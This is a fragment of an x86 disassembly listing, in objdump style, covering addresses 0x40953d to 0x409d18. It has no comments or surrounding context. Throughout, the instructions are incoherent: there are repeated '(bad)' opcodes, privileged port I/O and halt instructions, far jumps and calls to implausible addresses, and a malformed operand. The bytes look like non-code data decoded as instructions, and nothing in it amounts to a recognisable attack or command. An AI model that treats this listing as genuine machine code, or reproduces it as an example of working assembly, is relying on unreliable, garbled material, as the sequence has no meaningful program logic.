  40953d:	xchg   DWORD PTR [ebx+ebp*4-0x7df518c],esp
  409544:	loop   0x409548
  409546:	(bad)  
  409547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409548:	hlt    
  409549:	xchg   edi,eax
  40954a:	sbb    ah,BYTE PTR [ecx+0x3f5f7642]
  409550:	and    eax,0x112267b5
  409555:	cs scas eax,DWORD PTR es:[edi]
  409557:	enter  0x1bb2,0xcb
  40955b:	mov    WORD PTR [ebx+0x41],gs
  40955e:	leave  
  40955f:	push   edi
  409560:	dec    eax
  409561:	jmp    0x409535
  409563:	cwde   
  409564:	ds addr16 jb 0x409588
  409568:	lds    ebx,FWORD PTR [eax*8+0x7719390]
  40956f:	xor    al,0x9f
  409571:	xor    ebx,DWORD PTR [ebx-0xe]
  409574:	scas   al,BYTE PTR es:[edi]
  409575:	and    BYTE PTR [esi+0x13],0x43
  409579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40957a:	fist   DWORD PTR ds:0xbf23dc5f
  409580:	cwde   
  409581:	mov    cl,0xdc
  409583:	xchg   eax,edi
  409585:	mov    edx,0xad28e8d8
  40958a:	outs   dx,DWORD PTR ds:[esi]
  40958b:	push   edi
  40958c:	cwde   
  40958d:	adc    bl,dl
  40958f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409590:	xchg   DWORD PTR [edx],esp
  409592:	ret    0xa346
  409595:	push   eax
  409596:	(bad)  
  409597:	xor    eax,0xb83b5c37
  40959c:	pusha  
  40959d:	mov    dl,0x56
  40959f:	fld    st(3)
  4095a1:	cmp    BYTE PTR [ebp-0x1c],cl
  4095a4:	popf   
  4095a5:	test   DWORD PTR [edx],esi
  4095a7:	xchg   ebp,eax
  4095a8:	inc    edi
  4095a9:	and    dh,BYTE PTR [ebx]
  4095ab:	cmc    
  4095ac:	jo     0x40952f
  4095ae:	xchg   ebp,eax
  4095af:	push   edx
  4095b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095b1:	push   edx
  4095b2:	jmp    0xf9041459
  4095b7:	jb     0x409630
  4095b9:	mov    ecx,0x99b3bc59
  4095be:	aad    0x5d
  4095c0:	mov    eax,0x9d269018
  4095c5:	pop    ebx
  4095c6:	imul   ebx,DWORD PTR [edx],0xffffff90
  4095c9:	pop    ds
  4095ca:	repz das 
  4095cc:	inc    ebx
  4095cd:	shr    DWORD PTR [ebp+0x60],1
  4095d0:	loope  0x4095ed
  4095d2:	icebp  
  4095d3:	jmp    0xccd8ff25
  4095d8:	gs fs out 0xf9,al
  4095dc:	jg     0x40963a
  4095de:	mov    BYTE PTR [edi],ch
  4095e0:	xchg   ch,dl
  4095e2:	popa   
  4095e3:	out    0x16,al
  4095e5:	hlt    
  4095e6:	and    ch,0xa5
  4095e9:	rcr    BYTE PTR [edi],1
  4095eb:	jmp    DWORD PTR [esi+0x6606f2d3]
  4095f1:	gs nop
  4095f3:	jno    0x4095fe
  4095f5:	ja     0x409673
  4095f7:	or     BYTE PTR [edi+0x3baa8f58],ah
  4095fd:	sbb    BYTE PTR [eax+0x7efadfe],ah
  409603:	add    edi,DWORD PTR [eax+0x24d63a99]
  409609:	mov    al,ds:0xd0377d6e
  40960e:	jne    0x4095f8
  409610:	imul   ebx,edx,0x593f66b2
  409616:	push   ecx
  409617:	mov    esi,0x261c9257
  40961c:	jge    0x40960b
  40961e:	inc    esi
  40961f:	je     0x4095f7
  409621:	add    BYTE PTR [ebx+esi*1+0x6b],0x6
  409626:	jg     0x4095d7
  409628:	das    
  409629:	in     al,0x48
  40962b:	xchg   ecx,eax
  40962c:	dec    ebp
  40962d:	sbb    bl,BYTE PTR [eax-0x70cef261]
  409633:	push   cs
  409634:	hlt    
  409635:	in     eax,dx
  409636:	cs into 
  409638:	mov    bh,0x2
  40963a:	cmp    eax,0x40ae3eaf
  40963f:	(bad)  
  409640:	stc    
  409641:	rcr    BYTE PTR [esi+0x5b],0x82
  409645:	push   edi
  409646:	xor    al,0x9f
  409648:	mov    ?,esp
  40964a:	rol    BYTE PTR [esi-0x4],cl
  40964d:	sub    al,0x46
  40964f:	jb     0x4095e5
  409651:	jb     0x4095d9
  409653:	test   BYTE PTR [edi-0x4c498967],dh
  409659:	xor    ebx,esp
  40965b:	cs xchg edi,esi
  40965e:	cmp    eax,0xadf36f87
  409663:	stc    
  409664:	ret    0xabbb
  409667:	imul   ebx,DWORD PTR [ecx+0x45],0x6ec92b1d
  40966e:	jne    0x40963b
  409670:	imul   BYTE PTR [eax+edx*1]
  409673:	jl     0x40969a
  409675:	ret    
  409676:	dec    edi
  409677:	mov    esi,0xc853d8b4
  40967c:	push   ecx
  40967d:	fdiv   DWORD PTR [ebx]
  40967f:	(bad)  
  409680:	mov    eax,ds:0x8bfc5bf2
  409685:	sub    eax,0x2bcc9289
  40968a:	sub    BYTE PTR [edx+0x32],bl
  40968d:	(bad)  
  40968e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40968f:	sub    ah,dh
  409691:	mov    edx,0x3d661a1a
  409696:	pop    ss
  409697:	xchg   BYTE PTR [ebx],ch
  409699:	pop    eax
  40969a:	inc    ebp
  40969b:	inc    edi
  40969c:	push   es
  40969d:	pop    edx
  40969e:	jno    0x409673
  4096a0:	push   esp
  4096a1:	adc    edi,0xf
  4096a4:	or     ebx,esp
  4096a6:	inc    edi
  4096a7:	enter  0x9f06,0xfd
  4096ab:	imul   ebx,DWORD PTR [ebx+0x61],0x55
  4096af:	push   0xffffffb5
  4096b1:	jl     0x40964f
  4096b3:	mov    esi,0xc611b2ba
  4096b8:	(bad)  
  4096b9:	outs   dx,BYTE PTR ds:[esi]
  4096ba:	stc    
  4096bb:	or     bl,cl
  4096bd:	mov    dl,0x90
  4096bf:	enter  0xc2f3,0x88
  4096c3:	mov    ebx,0x3e7fedef
  4096c8:	mov    esp,DWORD PTR [eax-0x6afb2a57]
  4096ce:	adc    bh,0x91
  4096d1:	call   0x830cb313
  4096d6:	xor    DWORD PTR [edi],edx
  4096d8:	into   
  4096d9:	ret    0x8fb2
  4096dc:	stos   BYTE PTR es:[edi],al
  4096dd:	test   al,0xc7
  4096df:	pop    es
  4096e0:	xor    eax,0x49a4a80e
  4096e5:	les    ebx,FWORD PTR [ecx-0x5104a25f]
  4096eb:	aaa    
  4096ec:	mov    eax,0x1488f154
  4096f1:	push   ebp
  4096f2:	test   ah,0x54
  4096f5:	xchg   BYTE PTR [edx+0x1c],dh
  4096f8:	adc    eax,0xc6f6ae87
  4096fd:	cmp    eax,edi
  4096ff:	and    eax,0x1358c7a7
  409704:	pop    eax
  409705:	lea    ecx,[ecx-0x1f]
  409708:	les    ecx,FWORD PTR [eax]
  40970a:	test   eax,0x52c791af
  40970f:	adc    bl,BYTE PTR [edi+0x6eff3d03]
  409715:	dec    esi
  409716:	push   ebp
  409717:	and    eax,0xae29fe4e
  40971c:	dec    esi
  40971d:	jne    0x40970a
  40971f:	and    esp,DWORD PTR [ecx-0x54]
  409722:	mov    ch,0x8f
  409724:	lods   al,BYTE PTR ds:[esi]
  409725:	mov    al,ds:0x71dd4884
  40972a:	fsubr  st,st(4)
  40972c:	fcomp  QWORD PTR [ebp+0x5518ec9d]
  409732:	bound  ebx,QWORD PTR [esi]
  409734:	dec    edi
  409735:	xchg   edi,eax
  409736:	out    dx,al
  409737:	mov    DWORD PTR [edx+eax*4],esp
  40973a:	test   ch,bh
  40973c:	addr16 in eax,0x5a
  40973f:	fdivr  QWORD PTR [eax+0x4fbee56]
  409745:	test   BYTE PTR [ecx+0x24b64e],al
  40974b:	pushf  
  40974c:	mov    ah,0x3f
  40974e:	aaa    
  40974f:	xchg   ecx,eax
  409750:	jge    0x4096eb
  409752:	cmp    esi,ebp
  409754:	and    al,0x5a
  409756:	jae    0x4096dd
  409758:	int    0xdf
  40975a:	xchg   ebx,eax
  40975b:	jb     0x4097a5
  40975d:	push   ecx
  40975e:	arpl   WORD PTR [ebx-0x1c],dx
  409761:	cld    
  409762:	add    ah,BYTE PTR [esp+ebx*4-0x76]
  409766:	ja     0x409721
  409768:	enter  0x9add,0xd0
  40976c:	aad    0xcc
  40976e:	pushf  
  40976f:	and    BYTE PTR [ebx],ch
  409771:	adc    cl,BYTE PTR [esi-0x2b4eef90]
  409777:	shr    DWORD PTR [edi],1
  409779:	mov    ds:0x1666d717,eax
  40977e:	dec    BYTE PTR [ebx+eiz*1]
  409781:	fbstp  TBYTE PTR [esi-0x59035bde]
  409787:	arpl   dx,bp
  409789:	mov    bl,0x40
  40978b:	rol    ch,0xc6
  40978e:	das    
  40978f:	mov    ebx,0x626259a6
  409794:	popf   
  409795:	sti    
  409796:	inc    edx
  409797:	dec    edi
  409798:	popa   
  409799:	cmp    eax,0x1b79b024
  40979e:	mov    ebx,ebx
  4097a0:	dec    ebx
  4097a1:	in     eax,dx
  4097a2:	xchg   esi,eax
  4097a3:	mov    ah,0xee
  4097a5:	out    dx,al
  4097a6:	xchg   ebx,eax
  4097a7:	fcmove st,st(5)
  4097a9:	push   ecx
  4097aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ab:	xchg   ebx,eax
  4097ac:	enter  0xc24,0xdd
  4097b0:	mov    eax,0xefdf22de
  4097b5:	in     al,dx
  4097b6:	mov    dh,0xe
  4097b8:	cdq    
  4097b9:	mov    eax,ds:0x94b58776
  4097be:	inc    eax
  4097bf:	test   eax,0xcbbbe5e5
  4097c4:	adc    bh,0x31
  4097c7:	and    DWORD PTR [esi-0x6c],0x7d81642a
  4097ce:	pop    ss
  4097cf:	xor    ecx,ebx
  4097d1:	lea    esp,[edx]
  4097d3:	adc    al,0xda
  4097d5:	push   ebx
  4097d6:	mov    dl,0x0
  4097d8:	add    BYTE PTR [ecx-0xa],dh
  4097db:	inc    ebx
  4097dc:	xchg   edi,eax
  4097dd:	stc    
  4097de:	sub    ebp,edx
  4097e0:	leave  
  4097e1:	sub    ch,BYTE PTR [edx-0x12]
  4097e4:	pop    es
  4097e5:	pop    ss
  4097e6:	inc    ebp
  4097e7:	sub    ebp,ebx
  4097e9:	cwde   
  4097ea:	or     ecx,DWORD PTR [esi-0x61]
  4097ed:	xlat   BYTE PTR ds:[ebx]
  4097ee:	fidivr WORD PTR [ebx]
  4097f0:	in     eax,0x27
  4097f2:	sar    DWORD PTR [eax],1
  4097f4:	cli    
  4097f5:	aam    0x59
  4097f7:	mov    esp,0x9b83a189
  4097fc:	loope  0x409843
  4097fe:	xor    al,BYTE PTR [ebp+0x4]
  409801:	loop   0x409825
  409803:	add    al,0x87
  409805:	cmp    esi,DWORD PTR [eax+0x47c71c4e]
  40980b:	call   0x4bff:0x9f1053ef
  409812:	enter  0x4ffa,0x1
  409816:	iret   
  409817:	adc    esp,esp
  409819:	out    0x45,eax
  40981b:	mov    BYTE PTR [edx-0x4a220e6],0xa0
  409822:	popa   
  409823:	cwde   
  409824:	retf   0x1444
  409827:	aad    0xaa
  409829:	add    DWORD PTR ds:0xcc6a0eca,0xc018c1db
  409833:	retf   
  409834:	mov    cl,bh
  409836:	arpl   WORD PTR [esp+eax*8-0x6b37b665],bx
  40983d:	xchg   ebp,eax
  40983e:	hlt    
  40983f:	dec    edx
  409840:	inc    ecx
  409841:	je     0x40980a
  409843:	das    
  409844:	addr16 jnp 0x409888
  409847:	mov    dl,0x41
  409849:	js     0x409857
  40984b:	add    BYTE PTR [esi-0x6a5b33ce],bh
  409851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409852:	cmp    bl,bh
  409854:	cmp    al,0x89
  409856:	sbb    edx,DWORD PTR ds:0x8012fb74
  40985c:	mov    ds:0x79e4c1e6,eax
  409861:	loop   0x409899
  409863:	les    esi,FWORD PTR [ebp+0x2e88301a]
  409869:	xor    dl,al
  40986b:	nop
  40986c:	sbb    ebp,ebp
  40986e:	pop    ebx
  40986f:	call   0x17889972
  409874:	mov    bh,0xb
  409876:	pushf  
  409877:	dec    edi
  409878:	or     BYTE PTR [ebx-0x7d48176a],ah
  40987e:	jp     0x409849
  409880:	push   edi
  409881:	pop    edx
  409882:	mov    eax,0x811cf9b4
  409887:	jmp    0x4098a1
  409889:	and    DWORD PTR [eax+0x3bd5f849],edi
  40988f:	pop    ebp
  409890:	pop    ds
  409891:	xchg   BYTE PTR [edi-0x691b0626],bl
  409897:	add    al,0x82
  409899:	int3   
  40989a:	and    dh,al
  40989c:	int3   
  40989d:	inc    ebp
  40989e:	cmp    BYTE PTR [ebx],ch
  4098a0:	mov    dh,0x50
  4098a2:	adc    al,0x86
  4098a4:	cmp    ch,cl
  4098a6:	fisub  DWORD PTR [edx-0x5264bff2]
  4098ac:	popf   
  4098ad:	int    0x85
  4098af:	mov    cs:0x74d43b0e,eax
  4098b5:	xor    BYTE PTR [ebx+0x734983ce],bl
  4098bb:	mov    ds:0x6169c285,al
  4098c0:	inc    ebp
  4098c1:	aaa    
  4098c2:	div    BYTE PTR [edx-0x3af1b161]
  4098c8:	call   0x7850a4b
  4098cd:	xor    DWORD PTR [ebx-0x306fd533],ebp
  4098d3:	repz jbe 0x40986c
  4098d6:	or     BYTE PTR [ecx],cl
  4098d8:	mov    al,ds:0x98c27d85
  4098dd:	and    al,0x97
  4098df:	rcr    DWORD PTR [ecx],0xc2
  4098e2:	in     eax,dx
  4098e3:	adc    ecx,0x36
  4098e6:	dec    esi
  4098e7:	scas   al,BYTE PTR es:[edi]
  4098e8:	xchg   edx,eax
  4098e9:	or     eax,0x42c7c4df
  4098ee:	push   eax
  4098ef:	xlat   BYTE PTR ds:[ebx]
  4098f0:	clc    
  4098f1:	pop    ebp
  4098f2:	mov    ecx,0x80a38e0b
  4098f7:	push   esp
  4098f8:	mov    dl,0xdf
  4098fa:	icebp  
  4098fb:	lock inc eax
  4098fd:	into   
  4098fe:	es push 0x24
  409901:	out    0x2b,al
  409903:	xchg   BYTE PTR [ebx],bh
  409905:	jb     0x409945
  409907:	jp     0x40991d
  409909:	scas   al,BYTE PTR es:[edi]
  40990a:	jecxz  0x409918
  40990c:	fidiv  DWORD PTR [edx+0x23e1ab77]
  409912:	lods   eax,DWORD PTR ds:[esi]
  409913:	xchg   BYTE PTR [ecx+0x220c4258],bl
  409919:	ins    BYTE PTR es:[edi],dx
  40991a:	gs jmp 0x40997c
  40991d:	xlat   BYTE PTR ds:[ebx]
  40991e:	pop    eax
  40991f:	jne    0x4098ea
  409921:	xchg   esi,eax
  409922:	repz (bad) 
  409924:	ins    DWORD PTR es:[edi],dx
  409925:	jl     0x4098af
  409927:	pop    ebx
  409928:	int3   
  409929:	xor    al,0xca
  40992b:	xchg   DWORD PTR [ecx-0x76738d77],eax
  409931:	(bad)  [ecx]
  409933:	and    BYTE PTR [ebp-0x37ec1117],ah
  409939:	xor    ebp,DWORD PTR [edi*2+0x7d6edbaf]
  409940:	ret    
  409941:	in     eax,0xeb
  409943:	int3   
  409944:	cmp    BYTE PTR [ecx-0x2b],bh
  409947:	out    dx,eax
  409948:	aaa    
  409949:	push   edi
  40994a:	leave  
  40994b:	mov    ebx,0x342d817f
  409950:	pop    ecx
  409951:	loope  0x4098f8
  409953:	sbb    DWORD PTR gs:[edx+0x5b24097d],edx
  40995a:	jbe    0x409919
  40995c:	(bad)  
  40995d:	mov    edx,0xc1cba6f5
  409962:	inc    ebp
  409963:	push   ebx
  409964:	cwde   
  409965:	cmp    edx,DWORD PTR [esi-0x62]
  409968:	adc    edx,DWORD PTR [edx-0x1ea5516b]
  40996e:	mov    ah,0xc0
  409970:	shl    DWORD PTR ss:[esi],1
  409973:	sti    
  409974:	mov    edi,cs
  409976:	lock repz pop esi
  409979:	push   ebx
  40997a:	jl     0x4099f2
  40997c:	ins    BYTE PTR es:[edi],dx
  40997d:	mov    dh,0x2b
  40997f:	shr    DWORD PTR [esp+edx*4+0x29e83508],0x2b
  409987:	shr    bl,cl
  409989:	add    eax,0x361fbb7
  40998e:	jecxz  0x4099fd
  409990:	imul   esi,DWORD PTR [eax],0x52
  409993:	xchg   edx,eax
  409994:	clc    
  409995:	mov    al,ds:0xbc57c257
  40999a:	jne    0x409972
  40999c:	push   edx
  40999d:	dec    eax
  40999e:	lahf   
  40999f:	mov    ds,edi
  4099a1:	add    BYTE PTR ds:0x83199dbd,bh
  4099a7:	retf   0xef3d
  4099aa:	popa   
  4099ab:	enter  0x6085,0x1a
  4099af:	loop   0x409963
  4099b1:	adc    BYTE PTR [edi-0x5bbad47b],bl
  4099b7:	mov    ebx,0xa8e80778
  4099bc:	std    
  4099bd:	(bad)  
  4099be:	rcr    esp,cl
  4099c0:	xor    BYTE PTR [edx],bh
  4099c2:	or     eax,0xc9f055f9
  4099c7:	rcr    eax,0x63
  4099ca:	into   
  4099cb:	push   edi
  4099cc:	xor    edx,DWORD PTR [ebx-0x27492f2f]
  4099d2:	mov    al,0xa4
  4099d4:	jge    0x4099a9
  4099d6:	jge    0x409a1f
  4099d8:	pushf  
  4099d9:	inc    eax
  4099da:	cli    
  4099db:	daa    
  4099dc:	adc    DWORD PTR [ebx],ecx
  4099de:	sbb    BYTE PTR [ebx-0x57],dl
  4099e1:	shl    DWORD PTR [ebx],1
  4099e3:	push   ebp
  4099e4:	fnsave cs:[ecx-0x1b]
  4099e8:	xor    BYTE PTR [ebp-0x5cb330d9],0x9b
  4099ef:	(bad)  [ecx]
  4099f1:	xor    eax,0x1b9db571
  4099f6:	test   al,0x0
  4099f8:	sahf   
  4099f9:	cmp    DWORD PTR [edi+0x78f6b031],ecx
  4099ff:	cdq    
  409a00:	dec    esi
  409a01:	and    eax,0xf280ff27
  409a06:	cmp    DWORD PTR [edi],edi
  409a08:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  409a0a:	pop    edi
  409a0b:	adc    DWORD PTR [edi],edx
  409a0d:	into   
  409a0e:	ds mov edx,0x45003864
  409a14:	loope  0x409a51
  409a16:	icebp  
  409a17:	pop    edx
  409a18:	sbb    eax,0x1115cd1a
  409a1d:	dec    esi
  409a1e:	add    al,0x73
  409a20:	out    0xab,eax
  409a22:	xchg   edx,eax
  409a23:	xor    eax,0x432c868e
  409a28:	iret   
  409a29:	xor    al,0xf1
  409a2b:	jno    0x409a2c
  409a2d:	out    0xdb,eax
  409a2f:	hlt    
  409a30:	loope  0x409a7a
  409a32:	adc    al,0xe8
  409a34:	inc    edx
  409a35:	add    eax,0x44615cee
  409a3a:	(bad)  
  409a3b:	push   0xffffffe2
  409a3d:	mov    DWORD PTR [ebp+0x7d3f1980],ecx
  409a43:	sbb    bl,BYTE PTR [edi+0x6c]
  409a46:	nop
  409a47:	cmp    al,0x42
  409a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a4a:	fsub   DWORD PTR [ebp+0x7068c927]
  409a50:	daa    
  409a51:	ficomp DWORD PTR [edx]
  409a53:	sub    edx,esi
  409a55:	push   esi
  409a57:	jnp    0x409a67
  409a59:	push   edx
  409a5a:	push   esi
  409a5b:	int3   
  409a5c:	shr    DWORD PTR [esi-0x7d],1
  409a5f:	pop    ebx
  409a60:	repz mov al,ds:0x4925df4f
  409a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a67:	out    0xfb,eax
  409a69:	outs   dx,DWORD PTR ds:[esi]
  409a6a:	enter  0xe462,0xff
  409a6e:	fld    DWORD PTR ds:0x164ca4f4
  409a74:	mov    DWORD PTR [eax],ebx
  409a76:	add    edx,DWORD PTR [esi+ebp*8]
  409a79:	mov    ebx,DWORD PTR [ecx+0x70]
  409a7c:	jecxz  0x409a77
  409a7e:	push   esi
  409a7f:	pop    edi
  409a80:	gs inc ebx
  409a82:	add    BYTE PTR [edx+0x52a5732c],ah
  409a88:	cwde   
  409a89:	hlt    
  409a8a:	addr16 and eax,eax
  409a8d:	pop    ebx
  409a8e:	jg     0x409a61
  409a90:	add    al,0x7c
  409a92:	retf   0xe7e4
  409a95:	in     al,dx
  409a96:	mov    ah,0xa4
  409a98:	pushf  
  409a99:	and    DWORD PTR [edi-0x5],eax
  409a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a9d:	mov    ds:0xa6659c71,al
  409aa2:	inc    eax
  409aa3:	leave  
  409aa4:	inc    ebp
  409aa5:	iret   
  409aa6:	push   esi
  409aa7:	add    esp,edi
  409aa9:	xchg   ebp,eax
  409aaa:	in     al,0xf0
  409aac:	repnz inc ebp
  409aae:	pop    es
  409aaf:	xchg   edx,eax
  409ab0:	sbb    ah,ch
  409ab2:	adc    al,0xd4
  409ab4:	xor    DWORD PTR [edi],edi
  409ab6:	mov    ah,0xba
  409ab8:	or     eax,0x25f64eab
  409abd:	cmp    esp,ecx
  409abf:	xor    al,0x16
  409ac1:	xor    al,0xcb
  409ac3:	ja     0x409a78
  409ac5:	dec    esp
  409ac6:	jmp    0x409a8b
  409ac8:	je     0x409aed
  409aca:	add    eax,0x47b9c10d
  409acf:	call   0x151d:0x5aa7
  409ad5:	dec    ebp
  409ad6:	dec    ecx
  409ad7:	pop    eax
  409ad8:	out    0xc5,eax
  409ada:	es leave 
  409adc:	pop    ss
  409add:	repz out dx,al
  409adf:	jmp    0x71d6:0x7a874f7b
  409ae6:	jbe    0x409a7c
  409ae8:	gs jmp 0x59bcd6d3
  409aee:	enter  0xbbd3,0xbc
  409af2:	xor    edx,esp
  409af4:	das    
  409af5:	and    al,bh
  409af7:	xor    dh,BYTE PTR fs:[ebx-0x3]
  409afb:	adc    DWORD PTR [edi],edx
  409afd:	fst    QWORD PTR [edi+0xa912526]
  409b03:	pop    edi
  409b04:	mov    bh,0x5f
  409b06:	push   ss
  409b07:	jne    0x409b21
  409b09:	pop    esi
  409b0a:	sub    DWORD PTR [ebp+ebp*1+0x495f0832],ecx
  409b11:	pop    eax
  409b12:	push   eax
  409b13:	loope  0x409b5e
  409b15:	inc    esp
  409b16:	sbb    DWORD PTR [esi],edx
  409b18:	lea    esi,[esi]
  409b1a:	jmp    0x409ab4
  409b1c:	sbb    edi,DWORD PTR [esi-0x1cab9fe1]
  409b22:	sub    BYTE PTR [ebx+0x79f396a0],dh
  409b28:	or     edx,ebp
  409b2a:	cli    
  409b2b:	call   0x740c:0x1b771e60
  409b32:	test   BYTE PTR [edi-0x69],cl
  409b35:	outs   dx,BYTE PTR ds:[esi]
  409b36:	imul   ecx,DWORD PTR [esi],0xffffff99
  409b39:	lds    eax,FWORD PTR [ebp+0x39]
  409b3c:	ftst   
  409b3e:	jg     0x409ade
  409b40:	inc    si
  409b42:	or     ecx,DWORD PTR [eax]
  409b44:	retf   0x5b2b
  409b47:	pusha  
  409b48:	jmp    DWORD PTR ss:[ebx-0x7a]
  409b4c:	int    0xea
  409b4e:	dec    ebp
  409b4f:	pop    es
  409b50:	inc    eax
  409b51:	or     BYTE PTR [ebx+0x36a8c4f1],0xbe
  409b58:	fadd   QWORD PTR [eax+0x3a]
  409b5b:	sub    bl,BYTE PTR [ebp+0x6a]
  409b5e:	pushf  
  409b5f:	nop
  409b60:	xor    al,0x93
  409b62:	daa    
  409b63:	sbb    edi,DWORD PTR [edx+0x2aca5ba3]
  409b69:	aaa    
  409b6a:	jb     0x409b41
  409b6c:	push   es
  409b6d:	jb     0x409b58
  409b6f:	cld    
  409b70:	jle    0x409b50
  409b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b73:	rcl    cl,0x10
  409b76:	int    0xf0
  409b78:	push   es
  409b79:	or     DWORD PTR [edx-0x5b],ebp
  409b7c:	shl    BYTE PTR [ebp+0x61af1ed8],1
  409b82:	clc    
  409b83:	or     DWORD PTR [edx],0x77402858
  409b89:	mov    cl,0xfe
  409b8b:	sbb    ebp,esp
  409b8d:	call   0xed089280
  409b92:	or     ebx,DWORD PTR [eax+edx*4+0x752b7866]
  409b99:	push   es
  409b9a:	lea    edi,ds:0x2e6c02d0
  409ba0:	xor    eax,0x69969ed6
  409ba5:	add    BYTE PTR [ecx],bh
  409ba7:	cmc    
  409ba8:	scas   eax,DWORD PTR es:[edi]
  409ba9:	aaa    
  409baa:	cs scas al,BYTE PTR es:[edi]
  409bac:	jb     0x409ba1
  409bae:	das    
  409baf:	jge    0x409b56
  409bb1:	repnz shr ah,0x96
  409bb5:	mov    bh,0xc8
  409bb7:	xchg   edx,eax
  409bb8:	inc    edi
  409bb9:	lds    edi,FWORD PTR [ebp-0x46]
  409bbc:	enter  0x2f3d,0xc9
  409bc0:	inc    ebx
  409bc1:	add    eax,0xe1c70e13
  409bc6:	gs push edi
  409bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bc9:	and    esp,edx
  409bcb:	mov    dh,0xb0
  409bcd:	xor    ch,bl
  409bcf:	cdq    
  409bd0:	and    dl,BYTE PTR [esi-0x4c2b22e0]
  409bd6:	add    ebp,DWORD PTR [edx]
  409bd8:	dec    edi
  409bd9:	and    edi,DWORD PTR [ebp-0x12f4db02]
  409bdf:	lea    ebx,[esi-0x4dad3caa]
  409be5:	in     eax,dx
  409be6:	pop    edi
  409be7:	inc    edx
  409be8:	mov    ebp,0x5f706af4
  409bed:	pop    es
  409bee:	mov    cl,0x1a
  409bf0:	cmp    esi,edx
  409bf2:	sbb    ebp,DWORD PTR [edi]
  409bf4:	aaa    
  409bf5:	pusha  
  409bf6:	(bad)  
  409bf7:	or     al,0x2b
  409bf9:	rcl    DWORD PTR [eax-0x37],1
  409bfc:	add    al,0xc2
  409bfe:	ret    0xd44
  409c01:	or     bh,bl
  409c03:	inc    esi
  409c04:	mov    eax,ds:0x2ba6ce7e
  409c09:	imul   edx,ecx,0xffffffd0
  409c0c:	into   
  409c0d:	pop    edi
  409c0e:	jbe    0x409c45
  409c10:	push   cs
  409c11:	add    eax,0x933ab869
  409c16:	jo     0x409ba0
  409c18:	add    ebx,esp
  409c1a:	out    dx,al
  409c1b:	gs mov dh,0x85
  409c1e:	cmp    BYTE PTR [edx-0x25812426],dh
  409c24:	fs aaa 
  409c26:	or     al,0x9d
  409c28:	aam    0x88
  409c2a:	ret    0x609d
  409c2d:	sub    BYTE PTR [ebp+eax*8-0x46],bh
  409c31:	cmc    
  409c32:	js     0x409c6f
  409c34:	jns    0x409c57
  409c36:	mov    ah,0xb3
  409c38:	int    0x8e
  409c3a:	mov    bh,BYTE PTR [ecx+ecx*1+0x55]
  409c3e:	fs int3 
  409c40:	daa    
  409c41:	daa    
  409c42:	inc    ebp
  409c43:	(bad)  
  409c44:	pop    ecx
  409c45:	call   0xf64873c2
  409c4a:	dec    edi
  409c4b:	pushf  
  409c4c:	loopne 0x409c77
  409c4e:	and    ah,0xd9
  409c51:	test   BYTE PTR [ebx+0x73],0xf6
  409c55:	cmp    edi,DWORD PTR [edi]
  409c57:	leave  
  409c58:	retf   0x6801
  409c5b:	mov    al,ds:0x8771bb96
  409c60:	push   0x5
  409c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c63:	out    0x19,al
  409c65:	adc    ah,BYTE PTR [edx]
  409c67:	loop   0x409c21
  409c69:	or     DWORD PTR [esi-0x33],0x5f33748a
  409c70:	aas    
  409c71:	loop   0x409ca8
  409c73:	idiv   dh
  409c75:	xor    eax,0x981c8a2c
  409c7a:	pop    edx
  409c7c:	mov    ch,0xe8
  409c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c7f:	test   ch,ch
  409c81:	sub    eax,0x81c56621
  409c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c87:	adc    eax,0x6c1e6cfb
  409c8c:	sub    dh,dh
  409c8e:	(bad)  
  409c8f:	iret   
  409c90:	inc    esi
  409c91:	sbb    DWORD PTR [eax],eax
  409c93:	lahf   
  409c94:	fisub  DWORD PTR [edi+edi*8-0x1a134caa]
  409c9b:	jmp    0x409cc9
  409c9d:	std    
  409c9e:	inc    edx
  409c9f:	in     eax,dx
  409ca0:	adc    al,BYTE PTR cs:[ecx-0x4c7f03d1]
  409ca7:	inc    edx
  409ca8:	les    ebx,FWORD PTR [ecx-0x41]
  409cab:	popf   
  409cac:	in     eax,0x4
  409cae:	add    eax,0x4be28374
  409cb3:	adc    edx,DWORD PTR [ecx]
  409cb5:	das    
  409cb6:	loopne 0x409c66
  409cb8:	neg    BYTE PTR [ebp+0x5419ee7c]
  409cbe:	sub    DWORD PTR [edi+0x5099beda],ecx
  409cc4:	mov    dh,0xfe
  409cc6:	or     esi,0xffffff8d
  409cc9:	add    DWORD PTR [ecx],ebp
  409ccb:	shr    BYTE PTR [edi+0x19b535bf],cl
  409cd1:	fwait
  409cd2:	adc    eax,0x7a619717
  409cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cd8:	sub    DWORD PTR [edx],ebp
  409cda:	mov    cl,0x14
  409cdc:	lock mov esi,DWORD PTR [esi]
  409cdf:	mov    DWORD PTR [ebx+0x5d],esp
  409ce2:	call   0x6566b39
  409ce7:	sub    DWORD PTR cs:[edi+0x335850f9],ebx
  409cee:	push   eax
  409cef:	pop    edx
  409cf0:	pop    esi
  409cf1:	pop    edi
  409cf2:	adc    al,0xc2
  409cf4:	(bad)
  409cf8:	lea    eax,[ebp-0x14]
  409cfb:	mov    DWORD PTR [ebx-0x706b1750],esi
  409d01:	fwait
  409d02:	scas   eax,DWORD PTR es:[edi]
  409d03:	hlt    
  409d04:	cwde   
  409d05:	enter  0x3c17,0xb0
  409d09:	rol    BYTE PTR [edi],1
  409d0b:	jmp    DWORD PTR [eax]
  409d0d:	dec    ebp
  409d0e:	in     eax,0xcd
  409d10:	pop    ds
  409d11:	int3   
  409d12:	inc    edi
  409d13:	test   DWORD PTR [edi+0x15],ebx
  409d16:	loop   0x409caf
  409d18:	sti    
